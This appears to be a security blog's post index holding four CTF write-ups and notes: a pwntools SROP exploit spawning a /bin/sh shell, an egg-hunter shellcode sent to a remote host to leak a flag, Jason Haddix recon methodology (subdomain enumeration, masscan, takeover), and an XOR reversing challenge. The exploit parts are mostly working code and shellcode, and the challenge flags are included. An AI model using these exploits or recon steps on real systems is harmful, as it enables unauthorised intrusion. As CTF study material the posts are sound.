[{"content":"About SROP Wikipedia Nightmare by Guyinatuxedo Amriunix Blog Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from pwn import * context.arch = \u0026#34;amd64\u0026#34; e = ELF(\u0026#39;./sick_rop\u0026#39;) r = process(\u0026#39;./sick_rop\u0026#39;) syscall = 0x401014 vulnFun = p64(0x40102e) vulnPtr = 0x4010d8 virtual = 0x400000 overflow = b\u0026#39;A\u0026#39;*40 getShell = \u0026#34;\u0026#34;\u0026#34; push 0x42 pop rax inc ah cqo push rdx movabs rdi, 0x68732f2f6e69622f push rdi push rsp pop rsi mov r8, rdx mov r10, rdx syscall \u0026#34;\u0026#34;\u0026#34; shell = asm(getShell) frame = SigreturnFrame() frame.rax = 10 # sys_mprotect frame.rdi = virtual # Virtual Mem Segment frame.rsi = 0x4000 # Size frame.rdx = 7 # set rwx perm frame.rsp = vulnPtr # pointer to vuln func frame.rip = syscall # syscall addr payload = overflow + p64(e.symbols[\u0026#39;vuln\u0026#39;]) payload += p64(syscall) + bytes(frame) r.sendline(payload) r.recv() r.send(b\u0026#39;A\u0026#39;*15) r.recv() payload = overflow + p64(vulnPtr+16) + shell r.sendline(payload) r.recv() r.interactive() ","permalink":"/posts/htp-sick-rop/","summary":"About SROP Wikipedia Nightmare by Guyinatuxedo Amriunix Blog Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from pwn import * context.arch = \u0026#34;amd64\u0026#34; e = ELF(\u0026#39;./sick_rop\u0026#39;) r = process(\u0026#39;.","title":"HTB Sick ROP Writeup"},{"content":"\nAnalyzing the binary The binary haults for the input and crashes as we pass something. Upon reading the stings we found a string which looks like a dummy file. Time to look for it in IDA pro.\nIDA i changed some of the variable names for better understanding\nI jumped to the variable to see where it was being used and after reading the code we see that that string was being moved from one location to another. It first sets a new location and copies the flag to that location then empty\u0026rsquo;s flag value from the previous location. It also creates an exit signal and triggers it with a timer of 10 seconds. Which means that program will exit after 10 seconds. I am literally reversing it from down to top\nBefore the singnal code, it calls a function which returns a randomly generated number. Further reading the code we now know that it generates a number from a range of 0x5FFFFFFF \u0026lt; i \u0026lt;= 0xF7000000 which is a randomly generated address. Then it takes to a buffer size of 60 and executes it as a shellcode. (reason why the segfault)\nSo overall the program moves the flag to a random address location, kills the program after 10 seconds, reads our input and executes it as a shellcode.\nNOTE: Since the buffer size is limited. We have to be very creative and minimal while crafting our payload.\nPlanning our exploit Since the program kills itself after 10 seconds we will set up a timer with much higher value. Then we will traverse through addresses from a range of 0x5FFFFFFFsearching for the flag and send it to stdout if it matches.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 section .text global _start _start: ; Set a timer to send a SIGALRM signal after 120 seconds. push 120 pop ebx mov al, 0x1b int 0x80 ; Set the starting address for the search. mov edi, 0x7b425448 ; \u0026#34;{BTH\u0026#34; mov edx, 0x5fffffff next_page: ; Set the last byte address on the page. or dx, 0xfff ; Move to the next page. add edx, 4096 next_address: ; Move to the next address on the page. inc edx ; Check if the current address is valid. push edx xor ecx, ecx mov al, 0x21 int 0x80 pop edx ; If the address is not valid, go to the next page. cmp al, 0xf2 jz next_page ; Check if the value at the current address is the flag. cmp dword [edx], edi ; If the value matches, then stdout jnz next_address mov ecx, edx push 36 pop edx push 1 pop ebx mov al, 0x4 int 0x80 ; Exit the program. xor eax, eax ret Pwn Time First we craft our payload into bytecodes and send it through pwntools 1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * payload = b\u0026#34;\\x6a\\x3c\\x5b\\x6a\\x1b\\x58\\xcd\\x80\\xbf\\x48\\x54\\x42\\x7b\\xba\\xff\\xff\\xff\\x5f\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x31\\xc9\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xeb\\x39\\x3a\\x75\\xec\\x89\\xd1\\x6a\\x24\\x5a\\x6a\\x01\\x5b\\xb0\\x04\\xcd\\x80\u0026#34; #r = process(\u0026#34;./hunting\u0026#34;) r = remote(\u0026#34;134.209.22.121\u0026#34;, 31067) r.send(payload) f = r.recv() print(f) r.close() Flag: HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}\n","permalink":"/posts/htb-hunting-writeup/","summary":"Analyzing the binary The binary haults for the input and crashes as we pass something. Upon reading the stings we found a string which looks like a dummy file. Time to look for it in IDA pro.\nIDA i changed some of the variable names for better understanding\nI jumped to the variable to see where it was being used and after reading the code we see that that string was being moved from one location to another.","title":"HTB Hunting Writeup"},{"content":" 1 2 3 4 5 6 7 [ASN]───────────┐ ┌───────[Root Domain] |────[Recon]──{[TARGET]} [Acquisition]───| | [Linked]────────|────[Whois] | [SubDom]────┘ FINDING SEED DOMAIN https://crunchbase.com -\u0026gt; find related acquasitions of the company (ASN Finding) -\u0026gt; search for company name and asn numbers (doesnt tarcks cloud infra. spaces) https://bgp.he.net asnlookup.py(yassineaboukir) metabigor(j3ssiejjj) -\u0026gt; [echo \u0026rsquo;tesla\u0026rsquo; | metabigor net \u0026ndash;org -v] asnrecon (ASN Enum) -\u0026gt; For discovering more seed domains and return root domains amass(Jeff Foley) -\u0026gt; [amass intel -asn 46489] (Reverse whois) https://www.whoxy.com -\u0026gt; who has owned the company in the past DOMLink.py(Vincent Yiu) -\u0026gt; recursively query whoxy whois api (Ad/Analytics Relationship) https://builtwith.com/ -\u0026gt; gives technology profile and relations profile (Google-Fu) eg: \u0026ldquo;2019 Twitch INteractive, Inc.\u0026rdquo; inurl:twitch (Shodan) https://www.shodan.io/search?query=twitch.tv -\u0026gt; spiders infrastructure on the internet SUBDOMAIN ENUMERATION 1 2 3 4 5 [subdomain enum] |-[linked and js discovery] |-[subdomain scraping] |-[subdomain bruitforce] |- ++ (Linked and Js discovery)\nBurp Suite Pro -\u0026gt; hybrid technique to find both root/seed and subdomain visit a seed/root and spider all the linked html and js turn off passive scanning set forms auto to submit set scope to advance control and use \u0026ldquo;keyword\u0026rdquo; of target browse the site, then spider all hosts gospider(j3ssiejjj) -\u0026gt; [gospider -s https://www.twitch.tv] hakrawler(hakluke) subdomainizer(Neeraj Edwards) -\u0026gt; analyzing js and find out subdomains find cloud services referenced in js files use shannon entrophy formula to find sensitive items in js files such as api keys subscraper(Cillian Collins) -\u0026gt; just scrapes js files and finds subdomains (Subdomain Scraping) -\u0026gt; find more subdomains\n(Google) { - is used to exclude and narrow down the results} site:twitch.tv -www.twitch.tv site:twitch.tv -www.twitch.tv -watch.twitch.tv site:twitch.tv -www.twitch.tv -watch.twitch.tv -dev.twitch.tv amass -\u0026gt; [amass -d twitch.tv] amass correlates the scraped domain to ASN and list where they came forms this helps to know the technology they are using subfinder(projectdiscovery.io) -\u0026gt; [subfinder -d twitch.tv -v] github-subdomains.py(Gwendal Le) -\u0026gt; scrapes github repos and parse into list of subdomains shosubgo(inc0gbyt3) -\u0026gt; shodan scraper to find subdomain using {needs api key} (Cloud Ranges) -\u0026gt; technique to monitor whole cloud range for SSL sites and parse cert. to match target eg: [curl \u0026lsquo;https://tls.bufferover.run/dns?q=.twitch.tv\u0026rsquo; 2\u0026gt;/dev/null | jq .Results] Sam Erb defcon talk on how to set up such service (Subdomain Bruitforce) -\u0026gt; checking for live subdomains by resolving them\namass -\u0026gt; [amass enum -bruit -d twitch.tv -src] | [amass enum -bruit -d twitch.tv -rf resolvers.txt -w wordlist.list] shuffledns(projectdiscovery.io) -\u0026gt; [shuffledns -d twitch.tv -w list.txt -r resolvers.txt] (wordlist) Tailered wordlist make wordlist in fly TomNomNom tool for making Tailered wordlist {who, what, where when, wordlist talk} Massive wordlist use all in one massive wordlist all.txt by JHaddix https://github.com/assetnote/commonspeak2 (Alteration Scanning) -\u0026gt; pattern of bruit forcing when a common sequence eg: dev.company.com | dev1.company.com | dev2.company.com | dev-1.company.com | Dev.2.company.com OTHERS (port scan) masscan(Robert Graham) -\u0026gt; Used for scanning open ports {only for ip and not domain and much faster than nmap} [masscan -p1-65535 -iL $ipfile \u0026ndash;max-rate 1800 -oG $output.log] syntax guide: https://danielmiessler.com/study/masscan dnmasscan(rastating) -\u0026gt; Wrapper around masscan to scan domains [dnmasscan example.txt dns.log -oG scan.log] {example.txt contains dns and the ip will be stored in dns.log for further scanning} (service scan) brutespray(x90skysn3k) -\u0026gt; scans for default remote admin protocols after port scan (github dorking) Jhaddix bash script for github dork wrapper github-search(Gwendal Le) th3g3ntelman\u0026rsquo;s full module on github sensitive data exposure (Screenshotting) Aquatone HTTPscreenshot Eyewitness (for both http and https) SUBDOMAIN TAKEOVER occurs when a sub is pointing to a service which is removed or deleted. you can setup a page in similar service that was being used and point to that sub.\ncan-i-take-over-xyz(EdOverflow) -\u0026gt; github repo on how to claim subs for different services subover(Ic3man/projectdiscovery.io) nuclei(projectdiscovery.io) -\u0026gt; large scale tool AUTOMATION++ Interlace(Codingo) -\u0026gt; help glue up together these recon tools {hakluke\u0026rsquo;s guide on it} CIDR input Glob input threading proxying queue command etc.. ","permalink":"/posts/jhaddix-methodology-v4/","summary":"1 2 3 4 5 6 7 [ASN]───────────┐ ┌───────[Root Domain] |────[Recon]──{[TARGET]} [Acquisition]───| | [Linked]────────|────[Whois] | [SubDom]────┘ FINDING SEED DOMAIN https://crunchbase.com -\u0026gt; find related acquasitions of the company (ASN Finding) -\u0026gt; search for company name and asn numbers (doesnt tarcks cloud infra. spaces) https://bgp.he.net asnlookup.py(yassineaboukir) metabigor(j3ssiejjj) -\u0026gt; [echo \u0026rsquo;tesla\u0026rsquo; | metabigor net \u0026ndash;org -v] asnrecon (ASN Enum) -\u0026gt; For discovering more seed domains and return root domains amass(Jeff Foley) -\u0026gt; [amass intel -asn 46489] (Reverse whois) https://www.","title":"JHaddix Methodology V4"},{"content":"\nhmmm smol pp moment ! now we go open it in a disassembler\nlets read the main function! first it does its regular job of loading the stack and moving argc and argv to the registers then it checks weither the value of argc is == 2 as it takes one 1 argument vector shown in img1. If it fails the condition then it jumps to the address 0x11bd. less have a look at it.\nbrrr\u0026hellip;.as we can see it just prints out the string \u0026ldquo;Umm\u0026hellip;no\u0026hellip;\u0026rdquo; now lets see what happens if it matches the condition i.e if we pass something in the argument vector.\nokkkkkkkk wait i am feeling cold\u0026hellip; i am back. Back to the whatever we are doing. We can see that the string that we entered is being passed to a function call fun.00011dc. Now lets see what that function does to our baby stringwqnwdn. uhhghhghg my string ;-;-;-;!!\nbrrrr this shit is too confusing lets decompile it else ill die trying you dont want me to die right?\u0026hellip;.right? do you want me to die do you want me to DIE??? ok\nmuch better but we still need to do some cleanups\u0026hellip;wait here I just changed the variable names to something readable brrr wtf is uVar3 and var4h._4_4\nbefore we do anything else lets first see what that 0x4050 holds for us. shshbh \u0026ldquo;FZGSVdzohWNAAGSCW^z_HMf]THbJWUnT_URK\u0026rdquo; som crazy string. They are first comparing the length of that crazy string to the length of our baby string. And if the condition matches we enter inside the loop.\nlets make it moe simple [note: asuming crazy = 0x4050]\n1 2 3 4 5 6 7 8 13 j = crazy_string_len; 14 for(i = 0; i \u0026lt; crazy_string_len; i++){ 15 if (crazy[i] ^ j ^ 55 ) != 16 arg1[i]){ // this next line is on purpose cus i am trying to replicate the code line by line 17 return 0; 18 } 19 j--; 20 } j stores the length of that crazy string. Then inside the for loop we have an if with some condition. char at index i of crazy xor j xor 55 is != char at index i of our baby string. waaaaaaw now we know whats actually happening inside the hood. We can just write a script to solve it\nhmmm BIG pp moment !! we got the flag\n","permalink":"/posts/heapoverride-senpais-castle/","summary":"hmmm smol pp moment ! now we go open it in a disassembler\nlets read the main function! first it does its regular job of loading the stack and moving argc and argv to the registers then it checks weither the value of argc is == 2 as it takes one 1 argument vector shown in img1. If it fails the condition then it jumps to the address 0x11bd. less have a look at it.","title":"HeapOverride Senpai's Castle"}]